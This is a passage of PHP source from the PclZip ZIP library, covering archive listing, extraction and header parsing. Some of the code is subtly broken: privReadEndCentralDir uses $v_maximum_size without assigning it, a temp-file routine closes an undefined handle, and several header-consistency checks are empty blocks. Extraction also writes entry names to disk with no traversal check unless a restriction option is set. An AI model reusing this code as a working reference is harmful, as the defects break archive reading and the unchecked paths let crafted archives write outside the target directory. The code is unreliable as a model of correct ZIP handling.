					  $v_mtime, $v_mdate, $p_header['crc'],
                        $p_header['compressed_size'], $p_header['size'],
                        strlen($p_header['stored_filename']),
					  $p_header['extra_len'], $p_header['comment_len'],
                        $p_header['disk'], $p_header['internal'],
					  $p_header['external'], $p_header['offset']);

  fputs($this->zip_fd, $v_binary_data, 46);

  if (strlen($p_header['stored_filename']) != 0)
  {
    fputs($this->zip_fd, $p_header['stored_filename'], strlen($p_header['stored_filename']));
  }
  if ($p_header['extra_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['extra'], $p_header['extra_len']);
  }
  if ($p_header['comment_len'] != 0)
  {
    fputs($this->zip_fd, $p_header['comment'], $p_header['comment_len']);
  }

  return $v_result;
}

function privWriteCentralHeader($p_nb_entries, $p_size, $p_offset, $p_comment)
{
  $v_result=1;

  $v_binary_data = pack("VvvvvVVv", 0x06054b50, 0, 0, $p_nb_entries,
                      $p_nb_entries, $p_size,
					  $p_offset, strlen($p_comment));

  fputs($this->zip_fd, $v_binary_data, 22);

  if (strlen($p_comment) != 0)
  {
    fputs($this->zip_fd, $p_comment, strlen($p_comment));
  }

  return $v_result;
}

function privList(&$p_list)
{
  $v_result=1;

  $this->privDisableMagicQuotes();

  if (($this->zip_fd = @fopen($this->zipname, 'rb')) == 0)
  {
    $this->privSwapBackMagicQuotes();
    
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in binary read mode');

    return PclZip::errorCode();
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  @rewind($this->zip_fd);
  if (@fseek($this->zip_fd, $v_central_dir['offset']))
  {
    $this->privSwapBackMagicQuotes();

    PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

    return PclZip::errorCode();
  }

  for ($i=0; $i<$v_central_dir['entries']; $i++)
  {
    if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
    {
      $this->privSwapBackMagicQuotes();
      return $v_result;
    }
    $v_header['index'] = $i;

    $this->privConvertHeader2FileInfo($v_header, $p_list[$i]);
    unset($v_header);
  }

  $this->privCloseFd();

  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privConvertHeader2FileInfo($p_header, &$p_info)
{
  $v_result=1;

  $v_temp_path = PclZipUtilPathReduction($p_header['filename']);
  $p_info['filename'] = $v_temp_path;
  $v_temp_path = PclZipUtilPathReduction($p_header['stored_filename']);
  $p_info['stored_filename'] = $v_temp_path;
  $p_info['size'] = $p_header['size'];
  $p_info['compressed_size'] = $p_header['compressed_size'];
  $p_info['mtime'] = $p_header['mtime'];
  $p_info['comment'] = $p_header['comment'];
  $p_info['folder'] = (($p_header['external']&0x00000010)==0x00000010);
  $p_info['index'] = $p_header['index'];
  $p_info['status'] = $p_header['status'];
  $p_info['crc'] = $p_header['crc'];

  return $v_result;
}

function privExtractByRule(&$p_file_list, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
{
  $v_result=1;

  $this->privDisableMagicQuotes();

  if (   ($p_path == "")
    || (   (substr($p_path, 0, 1) != "/")
	    && (substr($p_path, 0, 3) != "../")
		&& (substr($p_path,1,2)!=":/")))
    $p_path = "./".$p_path;

  if (($p_path != "./") && ($p_path != "/"))
  {
    while (substr($p_path, -1) == "/")
    {
      $p_path = substr($p_path, 0, strlen($p_path)-1);
    }
  }

  if (($p_remove_path != "") && (substr($p_remove_path, -1) != '/'))
  {
    $p_remove_path .= '/';
  }
  $p_remove_path_size = strlen($p_remove_path);

  if (($v_result = $this->privOpenFd('rb')) != 1)
  {
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_pos_entry = $v_central_dir['offset'];

  $j_start = 0;
  for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
  {

    @rewind($this->zip_fd);
    if (@fseek($this->zip_fd, $v_pos_entry))
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

      return PclZip::errorCode();
    }

    $v_header = array();
    if (($v_result = $this->privReadCentralFileHeader($v_header)) != 1)
    {
      $this->privCloseFd();
      $this->privSwapBackMagicQuotes();

      return $v_result;
    }

    $v_header['index'] = $i;

    $v_pos_entry = ftell($this->zip_fd);

    $v_extract = false;

    if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
        && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {

        for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_extract); $j++) {

            if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {

                if (   (strlen($v_header['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                    && (substr($v_header['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_extract = true;
                }
            }
            elseif ($v_header['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                $v_extract = true;
            }
        }
    }


    else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
             && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {

        if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header['stored_filename'])) {
            $v_extract = true;
        }
    }

    else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
             && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {
        
        for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_extract); $j++) {

            if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                $v_extract = true;
            }
            if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                $j_start = $j+1;
            }

            if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                break;
            }
        }
    }

    else {
        $v_extract = true;
    }

  if (   ($v_extract)
      && (   ($v_header['compression'] != 8)
	      && ($v_header['compression'] != 0))) {
        $v_header['status'] = 'unsupported_compression';

        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

            $this->privSwapBackMagicQuotes();
            
            PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_COMPRESSION,
		                       "Filename '".$v_header['stored_filename']."' is "
			  	    	  	   ."compressed by an unsupported compression "
			  	    	  	   ."method (".$v_header['compression'].") ");

            return PclZip::errorCode();
	  }
  }
  
  if (($v_extract) && (($v_header['flag'] & 1) == 1)) {
        $v_header['status'] = 'unsupported_encryption';

        if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	      && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

            $this->privSwapBackMagicQuotes();

            PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION,
		                       "Unsupported encryption for "
			  	    	  	   ." filename '".$v_header['stored_filename']
							   ."'");

            return PclZip::errorCode();
	  }
  }

    if (($v_extract) && ($v_header['status'] != 'ok')) {
        $v_result = $this->privConvertHeader2FileInfo($v_header,
	                                        $p_file_list[$v_nb_extracted++]);
        if ($v_result != 1) {
            $this->privCloseFd();
            $this->privSwapBackMagicQuotes();
            return $v_result;
        }

        $v_extract = false;
    }
    
    if ($v_extract)
    {

      @rewind($this->zip_fd);
      if (@fseek($this->zip_fd, $v_header['offset']))
      {
        $this->privCloseFd();

        $this->privSwapBackMagicQuotes();

        PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

        return PclZip::errorCode();
      }

      if ($p_options[PCLZIP_OPT_EXTRACT_AS_STRING]) {

        $v_string = '';

        $v_result1 = $this->privExtractFileAsString($v_header, $v_string, $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted])) != 1)
        {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();

          return $v_result;
        }

        $p_file_list[$v_nb_extracted]['content'] = $v_string;

        $v_nb_extracted++;
        
        if ($v_result1 == 2) {
        	break;
        }
      }
      elseif (   (isset($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT]))
	        && ($p_options[PCLZIP_OPT_EXTRACT_IN_OUTPUT])) {
        $v_result1 = $this->privExtractFileInOutput($v_header, $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result;
        }

        if ($v_result1 == 2) {
        	break;
        }
      }
      else {
        $v_result1 = $this->privExtractFile($v_header,
	                                      $p_path, $p_remove_path,
										  $p_remove_all_path,
										  $p_options);
        if ($v_result1 < 1) {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();
          return $v_result1;
        }

        if (($v_result = $this->privConvertHeader2FileInfo($v_header, $p_file_list[$v_nb_extracted++])) != 1)
        {
          $this->privCloseFd();
          $this->privSwapBackMagicQuotes();

          return $v_result;
        }

        if ($v_result1 == 2) {
        	break;
        }
      }
    }
  }

  $this->privCloseFd();
  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privExtractFile(&$p_entry, $p_path, $p_remove_path, $p_remove_all_path, &$p_options)
{
  $v_result=1;

  if (($v_result = $this->privReadFileHeader($v_header)) != 1)
  {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if ($p_remove_all_path == true) {
      if (($p_entry['external']&0x00000010)==0x00000010) {

          $p_entry['status'] = "filtered";

          return $v_result;
      }

      $p_entry['filename'] = basename($p_entry['filename']);
  }

  else if ($p_remove_path != "")
  {
    if (PclZipUtilPathInclusion($p_remove_path, $p_entry['filename']) == 2)
    {

      $p_entry['status'] = "filtered";

      return $v_result;
    }

    $p_remove_path_size = strlen($p_remove_path);
    if (substr($p_entry['filename'], 0, $p_remove_path_size) == $p_remove_path)
    {

      $p_entry['filename'] = substr($p_entry['filename'], $p_remove_path_size);

    }
  }

  if ($p_path != '') {
    $p_entry['filename'] = $p_path."/".$p_entry['filename'];
  }
  
  if (isset($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION])) {
    $v_inclusion
    = PclZipUtilPathInclusion($p_options[PCLZIP_OPT_EXTRACT_DIR_RESTRICTION],
                              $p_entry['filename']); 
    if ($v_inclusion == 0) {

      PclZip::privErrorLog(PCLZIP_ERR_DIRECTORY_RESTRICTION,
		                     "Filename '".$p_entry['filename']."' is "
							 ."outside PCLZIP_OPT_EXTRACT_DIR_RESTRICTION");

      return PclZip::errorCode();
    }
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }
    
    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

  if (file_exists($p_entry['filename']))
  {

    if (is_dir($p_entry['filename']))
    {

      $p_entry['status'] = "already_a_directory";
      
      if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

          PclZip::privErrorLog(PCLZIP_ERR_ALREADY_A_DIRECTORY,
		                     "Filename '".$p_entry['filename']."' is "
							 ."already used by an existing directory");

          return PclZip::errorCode();
	    }
    }
    else if (!is_writeable($p_entry['filename']))
    {

      $p_entry['status'] = "write_protected";

      if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	    && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

          PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
		                     "Filename '".$p_entry['filename']."' exists "
							 ."and is write protected");

          return PclZip::errorCode();
	    }
    }

    else if (filemtime($p_entry['filename']) > $p_entry['mtime'])
    {
      if (   (isset($p_options[PCLZIP_OPT_REPLACE_NEWER]))
	    && ($p_options[PCLZIP_OPT_REPLACE_NEWER]===true)) {
  	  }
	    else {
          $p_entry['status'] = "newer_exist";

          if (   (isset($p_options[PCLZIP_OPT_STOP_ON_ERROR]))
	        && ($p_options[PCLZIP_OPT_STOP_ON_ERROR]===true)) {

              PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL,
		             "Newer version of '".$p_entry['filename']."' exists "
				    ."and option PCLZIP_OPT_REPLACE_NEWER is not selected");

              return PclZip::errorCode();
	      }
	    }
    }
    else {
    }
  }

  else {
    if ((($p_entry['external']&0x00000010)==0x00000010) || (substr($p_entry['filename'], -1) == '/'))
      $v_dir_to_check = $p_entry['filename'];
    else if (!strstr($p_entry['filename'], "/"))
      $v_dir_to_check = "";
    else
      $v_dir_to_check = dirname($p_entry['filename']);

      if (($v_result = $this->privDirCheck($v_dir_to_check, (($p_entry['external']&0x00000010)==0x00000010))) != 1) {

        $p_entry['status'] = "path_creation_fail";

        $v_result = 1;
      }
    }
  }

  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010))
    {
      if ($p_entry['compression'] == 0) {

        if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0)
        {

          $p_entry['status'] = "write_error";

          return $v_result;
        }


        $v_size = $p_entry['compressed_size'];
        while ($v_size != 0)
        {
          $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
          $v_buffer = @fread($this->zip_fd, $v_read_size);
          @fwrite($v_dest_file, $v_buffer, $v_read_size);            
          $v_size -= $v_read_size;
        }

        fclose($v_dest_file);

        touch($p_entry['filename'], $p_entry['mtime']);
        

      }
      else {
        if (($p_entry['flag'] & 1) == 1) {
          PclZip::privErrorLog(PCLZIP_ERR_UNSUPPORTED_ENCRYPTION, 'File \''.$p_entry['filename'].'\' is encrypted. Encrypted files are not supported.');
          return PclZip::errorCode();
        }


        if ( (!isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) 
            && (isset($p_options[PCLZIP_OPT_TEMP_FILE_ON])
                || (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
                    && ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] <= $p_entry['size'])) ) ) {
          $v_result = $this->privExtractFileUsingTempFile($p_entry, $p_options);
          if ($v_result < PCLZIP_ERR_NO_ERROR) {
            return $v_result;
          }
        }
        
        else {

        
          $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
          
          $v_file_content = @gzinflate($v_buffer);
          unset($v_buffer);
          if ($v_file_content === FALSE) {

            $p_entry['status'] = "error";
            
            return $v_result;
          }
          
          if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {

            $p_entry['status'] = "write_error";

            return $v_result;
          }

          @fwrite($v_dest_file, $v_file_content, $p_entry['size']);
          unset($v_file_content);

          @fclose($v_dest_file);
          
        }

        @touch($p_entry['filename'], $p_entry['mtime']);
      }

      if (isset($p_options[PCLZIP_OPT_SET_CHMOD])) {

        @chmod($p_entry['filename'], $p_options[PCLZIP_OPT_SET_CHMOD]);
      }

    }
  }

	if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
	}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privExtractFileUsingTempFile(&$p_entry, &$p_options)
{
  $v_result=1;
      
  $v_gzip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.gz';
  if (($v_dest_file = @fopen($v_gzip_temp_name, "wb")) == 0) {
    fclose($v_file);
    PclZip::privErrorLog(PCLZIP_ERR_WRITE_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary write mode');
    return PclZip::errorCode();
  }


  $v_binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($p_entry['compression']), Chr(0x00), time(), Chr(0x00), Chr(3));
  @fwrite($v_dest_file, $v_binary_data, 10);

  $v_size = $p_entry['compressed_size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($this->zip_fd, $v_read_size);
    @fwrite($v_dest_file, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_binary_data = pack('VV', $p_entry['crc'], $p_entry['size']);
  @fwrite($v_dest_file, $v_binary_data, 8);

  @fclose($v_dest_file);

  if (($v_dest_file = @fopen($p_entry['filename'], 'wb')) == 0) {
    $p_entry['status'] = "write_error";
    return $v_result;
  }

  if (($v_src_file = @gzopen($v_gzip_temp_name, 'rb')) == 0) {
    @fclose($v_dest_file);
    $p_entry['status'] = "read_error";
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_gzip_temp_name.'\' in binary read mode');
    return PclZip::errorCode();
  }


  $v_size = $p_entry['size'];
  while ($v_size != 0) {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @gzread($v_src_file, $v_read_size);
    @fwrite($v_dest_file, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }
  @fclose($v_dest_file);
  @gzclose($v_src_file);

  @unlink($v_gzip_temp_name);
  
  return $v_result;
}

function privExtractFileInOutput(&$p_entry, &$p_options)
{
  $v_result=1;

  if (($v_result = $this->privReadFileHeader($v_header)) != 1) {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }

    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010)) {
      if ($p_entry['compressed_size'] == $p_entry['size']) {

        $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);

        echo $v_buffer;
        unset($v_buffer);
      }
      else {

        $v_buffer = @fread($this->zip_fd, $p_entry['compressed_size']);
        
        $v_file_content = gzinflate($v_buffer);
        unset($v_buffer);

        echo $v_file_content;
        unset($v_file_content);
      }
    }
  }

if ($p_entry['status'] == "aborted") {
    $p_entry['status'] = "skipped";
}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privExtractFileAsString(&$p_entry, &$p_string, &$p_options)
{
  $v_result=1;

  $v_header = array();
  if (($v_result = $this->privReadFileHeader($v_header)) != 1)
  {
    return $v_result;
  }


  if ($this->privCheckFileHeaders($v_header, $p_entry) != 1) {
  }

  if (isset($p_options[PCLZIP_CB_PRE_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_EXTRACT](PCLZIP_CB_PRE_EXTRACT, $v_local_header);
    if ($v_result == 0) {
      $p_entry['status'] = "skipped";
      $v_result = 1;
    }
    
    if ($v_result == 2) {
      $p_entry['status'] = "aborted";
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }

    $p_entry['filename'] = $v_local_header['filename'];
  }


  if ($p_entry['status'] == 'ok') {

    if (!(($p_entry['external']&0x00000010)==0x00000010)) {
      if ($p_entry['compression'] == 0) {

        $p_string = @fread($this->zip_fd, $p_entry['compressed_size']);
      }
      else {

        $v_data = @fread($this->zip_fd, $p_entry['compressed_size']);
        
        if (($p_string = @gzinflate($v_data)) === FALSE) {
        }
      }

    }
    else {
    }
    
  }

	if ($p_entry['status'] == "aborted") {
      $p_entry['status'] = "skipped";
	}

  elseif (isset($p_options[PCLZIP_CB_POST_EXTRACT])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_entry, $v_local_header);
    
    $v_local_header['content'] = $p_string;
    $p_string = '';

    $v_result = $p_options[PCLZIP_CB_POST_EXTRACT](PCLZIP_CB_POST_EXTRACT, $v_local_header);

    $p_string = $v_local_header['content'];
    unset($v_local_header['content']);

    if ($v_result == 2) {
    	$v_result = PCLZIP_ERR_USER_ABORTED;
    }
  }

  return $v_result;
}

function privReadFileHeader(&$p_header)
{
  $v_result=1;

  $v_binary_data = @fread($this->zip_fd, 4);
  $v_data = unpack('Vid', $v_binary_data);

  if ($v_data['id'] != 0x04034b50)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

    return PclZip::errorCode();
  }

  $v_binary_data = fread($this->zip_fd, 26);

  if (strlen($v_binary_data) != 26)
  {
    $p_header['filename'] = "";
    $p_header['status'] = "invalid_header";

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $v_data = unpack('vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $v_binary_data);

  $p_header['filename'] = fread($this->zip_fd, $v_data['filename_len']);

  if ($v_data['extra_len'] != 0) {
    $p_header['extra'] = fread($this->zip_fd, $v_data['extra_len']);
  }
  else {
    $p_header['extra'] = '';
  }

  $p_header['version_extracted'] = $v_data['version'];
  $p_header['compression'] = $v_data['compression'];
  $p_header['size'] = $v_data['size'];
  $p_header['compressed_size'] = $v_data['compressed_size'];
  $p_header['crc'] = $v_data['crc'];
  $p_header['flag'] = $v_data['flag'];
  $p_header['filename_len'] = $v_data['filename_len'];

  $p_header['mdate'] = $v_data['mdate'];
  $p_header['mtime'] = $v_data['mtime'];
  if ($p_header['mdate'] && $p_header['mtime'])
  {
    $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
    $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
    $v_seconde = ($p_header['mtime'] & 0x001F)*2;

    $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
    $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
    $v_day = $p_header['mdate'] & 0x001F;

    $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

  }
  else
  {
    $p_header['mtime'] = time();
  }


  $p_header['stored_filename'] = $p_header['filename'];

  $p_header['status'] = "ok";

  return $v_result;
}

function privReadCentralFileHeader(&$p_header)
{
  $v_result=1;

  $v_binary_data = @fread($this->zip_fd, 4);
  $v_data = unpack('Vid', $v_binary_data);

  if ($v_data['id'] != 0x02014b50)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

    return PclZip::errorCode();
  }

  $v_binary_data = fread($this->zip_fd, 42);

  if (strlen($v_binary_data) != 42)
  {
    $p_header['filename'] = "";
    $p_header['status'] = "invalid_header";

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $p_header = unpack('vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $v_binary_data);

  if ($p_header['filename_len'] != 0)
    $p_header['filename'] = fread($this->zip_fd, $p_header['filename_len']);
  else
    $p_header['filename'] = '';

  if ($p_header['extra_len'] != 0)
    $p_header['extra'] = fread($this->zip_fd, $p_header['extra_len']);
  else
    $p_header['extra'] = '';

  if ($p_header['comment_len'] != 0)
    $p_header['comment'] = fread($this->zip_fd, $p_header['comment_len']);
  else
    $p_header['comment'] = '';

  if (1)
  {
    $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
    $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
    $v_seconde = ($p_header['mtime'] & 0x001F)*2;

    $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
    $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
    $v_day = $p_header['mdate'] & 0x001F;

    $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

  }
  else
  {
    $p_header['mtime'] = time();
  }

  $p_header['stored_filename'] = $p_header['filename'];

  $p_header['status'] = 'ok';

  if (substr($p_header['filename'], -1) == '/') {
    $p_header['external'] = 0x00000010;
  }


  return $v_result;
}

function privCheckFileHeaders(&$p_local_header, &$p_central_header)
{
  $v_result=1;

	if ($p_local_header['filename'] != $p_central_header['filename']) {
	}
	if ($p_local_header['version_extracted'] != $p_central_header['version_extracted']) {
	}
	if ($p_local_header['flag'] != $p_central_header['flag']) {
	}
	if ($p_local_header['compression'] != $p_central_header['compression']) {
	}
	if ($p_local_header['mtime'] != $p_central_header['mtime']) {
	}
	if ($p_local_header['filename_len'] != $p_central_header['filename_len']) {
	}

	if (($p_local_header['flag'] & 8) == 8) {
        $p_local_header['size'] = $p_central_header['size'];
        $p_local_header['compressed_size'] = $p_central_header['compressed_size'];
        $p_local_header['crc'] = $p_central_header['crc'];
	}

  return $v_result;
}

function privReadEndCentralDir(&$p_central_dir)
{
  $v_result=1;

  $v_size = filesize($this->zipname);
  @fseek($this->zip_fd, $v_size);
  if (@ftell($this->zip_fd) != $v_size)
  {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to go to the end of the archive \''.$this->zipname.'\'');

    return PclZip::errorCode();
  }

  $v_found = 0;
  if ($v_size > 26) {
    @fseek($this->zip_fd, $v_size-22);
    if (($v_pos = @ftell($this->zip_fd)) != ($v_size-22))
    {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

      return PclZip::errorCode();
    }

    $v_binary_data = @fread($this->zip_fd, 4);
    $v_data = @unpack('Vid', $v_binary_data);

    if ($v_data['id'] == 0x06054b50) {
      $v_found = 1;
    }

    $v_pos = ftell($this->zip_fd);
  }

  if (!$v_found) {
    if ($v_maximum_size > $v_size)
      $v_maximum_size = $v_size;
    @fseek($this->zip_fd, $v_size-$v_maximum_size);
    if (@ftell($this->zip_fd) != ($v_size-$v_maximum_size))
    {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

      return PclZip::errorCode();
    }

    $v_pos = ftell($this->zip_fd);
    $v_bytes = 0x00000000;
    while ($v_pos < $v_size)
    {
      $v_byte = @fread($this->zip_fd, 1);

      $v_bytes = ( ($v_bytes & 0xFFFFFF) << 8) | Ord($v_byte); 

      if ($v_bytes == 0x504b0506)
      {
        $v_pos++;
        break;
      }

      $v_pos++;
    }

    if ($v_pos == $v_size)
    {

      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Unable to find End of Central Dir Record signature");

      return PclZip::errorCode();
    }
  }

  $v_binary_data = fread($this->zip_fd, 18);

  if (strlen($v_binary_data) != 18)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid End of Central Dir Record size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $v_data = unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size', $v_binary_data);

  if (($v_pos + $v_data['comment_size'] + 18) != $v_size) {

  if (0) {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT,
                       'The central dir is not at the end of the archive.'
					   .' Some trailing bytes exists after the archive.');

    return PclZip::errorCode();
  }
  }

  if ($v_data['comment_size'] != 0) {
    $p_central_dir['comment'] = fread($this->zip_fd, $v_data['comment_size']);
  }
  else
    $p_central_dir['comment'] = '';

  $p_central_dir['entries'] = $v_data['entries'];
  $p_central_dir['disk_entries'] = $v_data['disk_entries'];
  $p_central_dir['offset'] = $v_data['offset'];
  $p_central_dir['size'] = $v_data['size'];
  $p_central_dir['disk'] = $v_data['disk'];
  $p_central_dir['disk_start'] = $v_data['disk_start'];


  return $v_result;
}

function privDeleteByRule(&$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();

